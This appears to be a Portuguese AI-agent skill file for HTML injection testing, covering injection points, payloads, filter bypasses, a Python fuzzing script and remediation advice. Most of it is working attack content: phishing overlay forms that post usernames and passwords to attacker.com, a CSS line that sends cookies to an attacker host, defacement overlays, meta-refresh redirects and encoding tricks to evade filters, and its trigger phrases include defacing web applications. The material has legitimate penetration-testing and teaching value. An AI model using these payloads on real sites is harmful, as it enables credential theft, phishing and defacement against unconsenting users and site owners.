---
name: Teste de Injeção de HTML
description: Esta skill deve ser usada quando o usuário solicitar "testar injeção de HTML", "injetar HTML em páginas web", "realizar ataques de injeção de HTML", "desfigurar aplicações web" ou "testar vulnerabilidades de injeção de conteúdo". Fornece técnicas abrangentes de ataque de injeção de HTML e metodologias de teste.
metadata:
  author: zebbern
  version: "1.1"
---

# Teste de Injeção de HTML

## Propósito

Identificar e explorar vulnerabilidades de injeção de HTML que permitem a atacantes injetar conteúdo HTML malicioso em aplicações web. Esta vulnerabilidade permite a atacantes modificar a aparência da página, criar páginas de phishing e roubar credenciais de usuários através de formulários injetados.

## Pré-requisitos

### Ferramentas Obrigatórias
- Navegador web com ferramentas de desenvolvedor
- Burp Suite ou OWASP ZAP
- Tamper Data ou proxy similar
- cURL para testar payloads

### Conhecimento Obrigatório
- Fundamentos de HTML
- Estrutura de requisição/resposta HTTP
- Tratamento de entrada em aplicações web
- Diferença entre injeção de HTML e XSS

## Saídas e Entregas

1. **Relatório de Vulnerabilidade** - Pontos de injeção identificados
2. **Prova de Exploração** - Manipulação de conteúdo demonstrada
3. **Avaliação de Impacto** - Riscos potenciais de phishing e desfiguração
4. **Orientação de Remediação** - Recomendações de validação de entrada

## Fluxo de Trabalho Central

### Fase 1: Compreendendo Injeção de HTML

Injeção de HTML ocorre quando entrada do usuário é refletida em páginas web sem sanitização apropriada:

```html
<!-- Código vulnerável exemplo -->
<div>
    Bem-vindo, <?php echo $_GET['name']; ?>
</div>

<!-- Entrada de ataque -->
?name=<h1>Conteúdo Injetado</h1>

<!-- Saída renderizada -->
<div>
    Bem-vindo, <h1>Conteúdo Injetado</h1>
</div>
```

Diferenças principais de XSS:
- Injeção de HTML: Apenas tags HTML são renderizadas
- XSS: Código JavaScript é executado
- Injeção de HTML é frequentemente um passo para XSS

Objetivos de ataque:
- Modificar aparência do site (desfiguração)
- Criar formulários de login falsos (phishing)
- Injetar links maliciosos
- Exibir conteúdo enganoso

### Fase 2: Identificando Pontos de Injeção

Mapeie a aplicação em busca de superfícies potenciais de injeção:

```
1. Barras de busca e resultados de busca
2. Seções de comentários
3. Campos de perfil de usuário
4. Formulários de contato e feedback
5. Formulários de registro
6. Parâmetros de URL refletidos na página
7. Mensagens de erro
8. Títulos e headers da página
9. Campos de formulário ocultos
10. Valores de cookie refletidos na página
```

Parâmetros comumente vulneráveis:
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### Fase 3: Teste Básico de Injeção de HTML

Teste com tags HTML simples:

```html
<!-- Formatação de texto básica -->
<h1>Teste de Injeção</h1>
<b>Texto em Negrito</b>
<i>Texto em Itálico</i>
<u>Texto Sublinhado</u>
<font color="red">Texto Vermelho</font>

<!-- Elementos estruturais -->
<div style="background:red;color:white;padding:10px">DIV Injetada</div>
<p>Parágrafo injetado</p>
<br><br><br>Quebras de linha

<!-- Links -->
<a href="http://attacker.com">Clique Aqui</a>
<a href="http://attacker.com">Link Legítimo</a>

<!-- Imagens -->
<img src="http://attacker.com/image.png">
<img src="x" onerror="alert(1)">  <!-- Tentativa de XSS -->
```

Fluxo de trabalho de teste:
```bash
# Teste injeção básica
curl "http://target.com/search?q=<h1>Teste</h1>"

# Verifique se HTML renderiza na resposta
curl -s "http://target.com/search?q=<b>Negrito</b>" | grep -i "negrito"

# Teste em forma URL-encoded
curl "http://target.com/search?q=%3Ch1%3ETeste%3C%2Fh1%3E"
```

### Fase 4: Tipos de Injeção de HTML

#### Injeção de HTML Armazenada

Payload persiste no banco de dados:

```html
<!-- Injeção de bio de perfil -->
Nome: João Silva
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site em Manutenção</h1>
     <p>Por favor, faça login em <a href="http://attacker.com/login">portal.empresa.com</a></p>
     </div>

<!-- Injeção de comentário -->
Ótimo artigo!
<form action="http://attacker.com/steal" method="POST">
    <input name="username" placeholder="Sessão expirada. Digite seu usuário:">
    <input name="password" type="password" placeholder="Senha:">
    <input type="submit" value="Login">
</form>
```

#### Injeção GET Refletida

Payload em parâmetros de URL:

```html
<!-- Injeção de URL -->
http://target.com/welcome?name=<h1>Bem-vindo%20Admin</h1><form%20action="http://attacker.com/steal">

<!-- Injeção de resultado de busca -->
http://target.com/search?q=<marquee>Sua%20conta%20foi%20comprometida</marquee>
```

#### Injeção POST Refletida

Payload em dados POST:

```bash
# Teste de injeção POST
curl -X POST -d "comment=<div style='color:red'>Conteúdo Malicioso</div>" \
     http://target.com/submit

# Injeção de campo de formulário
curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
     http://target.com/register
```

#### Injeção Baseada em URL

Injetar em URLs exibidas:

```html
<!-- Se URL for exibida na página -->
http://target.com/page/<h1>Injetado</h1>

<!-- Injeção baseada em path -->
http://target.com/users/<img src=x>/profile
```

### Fase 5: Construção de Ataque de Phishing

Crie formulários de phishing convincentes:

```html
<!-- Sobreposição de formulário de login falso -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:white;z-index:9999;padding:50px;">
    <h2>Sessão Expirada</h2>
    <p>Sua sessão expirou. Por favor, faça login novamente.</p>
    <form action="http://attacker.com/capture" method="POST">
        <label>Usuário:</label><br>
        <input type="text" name="username" style="width:200px;"><br><br>
        <label>Senha:</label><br>
        <input type="password" name="password" style="width:200px;"><br><br>
        <input type="submit" value="Login">
    </form>
</div>

<!-- Roubo de credenciais oculto -->
<style>
    input { background: url('http://attacker.com/log?data=') }
</style>
<form action="http://attacker.com/steal" method="POST">
    <input name="user" placeholder="Verifique seu usuário">
    <input name="pass" type="password" placeholder="Verifique sua senha">
    <button>Verificar</button>
</form>
```

Link de phishing URL-encoded:
```
http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESessão%20Expirada%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Usuário%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
```

### Fase 6: Payloads de Desfiguração

Manipulação da aparência do site:

```html
<!-- Sobreposição de página inteira -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKEADO POR TESTADOR DE SEGURANÇA</h1>
</div>

<!-- Substituição de conteúdo -->
<style>body{display:none}</style>
<body style="display:block !important">
    <h1>Este site foi comprometido</h1>
</body>

<!-- Injeção de imagem -->
<img src="http://attacker.com/defaced.jpg" 
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">

<!-- Injeção de marquee (movimento visível) -->
<marquee behavior="alternate" style="font-size:50px;color:red;">
    VULNERABILIDADE DE SEGURANÇA DETECTADA
</marquee>
```

### Fase 7: Técnicas de Injeção Avançadas

#### Injeção de CSS

```html
<!-- Injeção de estilo -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Injeção de estilo inline -->
<div style="background:url('http://attacker.com/log')">Conteúdo</div>
```

#### Injeção de Meta Tag

```html
<!-- Redirecionamento via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- Tentativa de bypass de CSP -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Sobreposição de Ação de Formulário

```html
<!-- Sequestro de formulário existente -->
<form action="http://attacker.com/steal">

<!-- Se formulário já existe, adicione entrada -->
<input type="hidden" name="extra" value="data">
</form>
```

#### Injeção de iframe

```html
<!-- Embutir conteúdo externo -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- iframe invisível de rastreamento -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

### Fase 8: Técnicas de Bypass

Evite filtros básicos:

```html
<!-- Variações de case -->
<H1>Teste</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- Variações de codificação -->
&#60;h1&#62;Codificado&#60;/h1&#62;
%3Ch1%3EURL%20Codificado%3C%2Fh1%3E

<!-- Divisão de tag -->
<h
1>Tag Dividida</h1>

<!-- Null bytes -->
<h1%00>Null Byte</h1>

<!-- Dupla codificação -->
%253Ch1%253EDupla%2520Codificada%253C%252Fh1%253E

<!-- Codificação Unicode -->
\u003ch1\u003eUnicode\u003c/h1\u003e

<!-- Baseado em atributo -->
<div onmouseover="alert(1)">Passe o mouse</div>
<img src=x onerror=alert(1)>
```

### Fase 9: Teste Automatizado

#### Usando Burp Suite

```
1. Capture requisição com ponto de injeção potencial
2. Envie para Intruder
3. Marque valor de parâmetro como posição de payload
4. Carregue wordlist de injeção de HTML
5. Inicie ataque
6. Filtre respostas por HTML renderizado
7. Valide manualmente injeções bem-sucedidas
```

#### Usando OWASP ZAP

```
1. Spider a aplicação alvo
2. Scan Ativo com regras de injeção de HTML
3. Revise Alertas para descobertas de injeção
4. Valide descobertas manualmente
```

#### Script de Fuzzing Personalizado

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://target.com/search"
param = "q"

payloads = [
    "<h1>Teste</h1>",
    "<b>Negrito</b>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='http://evil.com'>Clique</a>",
    "<div style='color:red'>Estilizado</div>",
    "<marquee>Movendo</marquee>",
    "<iframe src='http://evil.com'></iframe>",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        if payload.lower() in response.text.lower():
            print(f"[+] Injeção possível: {payload}")
        elif "<h1>" in response.text or "<b>" in response.text:
            print(f"[?] Reflexão parcial: {payload}")
    except Exception as e:
        print(f"[-] Erro: {e}")
```

### Fase 10: Prevenção e Remediação

Práticas de codificação segura:

```php
// PHP: Escape de saída
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// PHP: Remover tags
echo strip_tags($user_input);

// PHP: Permitir apenas tags específicas
echo strip_tags($user_input, '<p><b><i>');
```

```python
# Python: Escape de HTML
from html import escape
safe_output = escape(user_input)

# Python Flask: Auto-escaping
{{ user_input }}  # Jinja2 escapa por padrão
{{ user_input | safe }}  # Marca como seguro (perigoso!)
```

```javascript
// JavaScript: Conteúdo de texto (seguro)
element.textContent = userInput;

// JavaScript: innerHTML (perigoso!)
element.innerHTML = userInput;  // Vulnerável!

// JavaScript: Sanitizar
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

Proteções do lado do servidor:
- Validação de entrada (whitelist de caracteres permitidos)
- Codificação de saída (escaping consciente do contexto)
- Headers Content Security Policy (CSP)
- Regras de Web Application Firewall (WAF)

## Referência Rápida

### Payloads de Teste Comuns

| Payload | Propósito |
|---------|-----------|
| `<h1>Teste</h1>` | Teste de renderização básica |
| `<b>Negrito</b>` | Formatação simples |
| `<a href="evil.com">Link</a>` | Injeção de link |
| `<img src=x>` | Teste de tag de imagem |
| `<div style="color:red">` | Injeção de estilo |
| `<form action="evil.com">` | Sequestro de formulário |

### Contextos de Injeção

| Contexto | Abordagem de Teste |
|----------|-------------------|
| Parâmetro de URL | `?param=<h1>teste</h1>` |
| Campo de formulário | POST com payload HTML |
| Valor de cookie | Injetar via document.cookie |
| Header HTTP | Injetar em Referer/User-Agent |
| Upload de arquivo | Arquivo HTML com conteúdo malicioso |

### Tipos de Codificação

| Tipo | Exemplo |
|------|---------|
| URL encoding | `%3Ch1%3E` = `<h1>` |
| Entidades HTML | `&#60;h1&#62;` = `<h1>` |
| Dupla codificação | `%253C` = `<` |
| Unicode | `\u003c` = `<` |

## Restrições e Limitações

### Limitações de Ataque
- Navegadores modernos podem sanitizar algumas injeções
- CSP pode prevenir estilos inline e scripts
- WAFs podem bloquear payloads comuns
- Algumas aplicações escapam saída corretamente

### Considerações de Teste
- Diferencie entre injeção de HTML e XSS
- Verifique impacto visual no navegador
- Teste em múltiplos navegadores
- Verifique armazenado vs refletido

### Avaliação de Severidade
- Severidade menor que XSS (sem execução de script)
- Maior impacto quando combinado com phishing
- Considere dano à reputação/desfiguração
- Avalie potencial de roubo de credenciais

## Resolução de Problemas

| Problema | Soluções |
|----------|----------|
| HTML não renderiza | Verifique se saída é HTML-encoded; tente variações de codificação; verifique contexto HTML |
| Payload removido | Use variações de codificação; tente divisão de tag; teste null bytes; tags aninhadas |
| XSS não funciona (apenas HTML) | JS filtrado mas HTML permitido; aproveite formulários de phishing, redirecionamentos via meta refresh |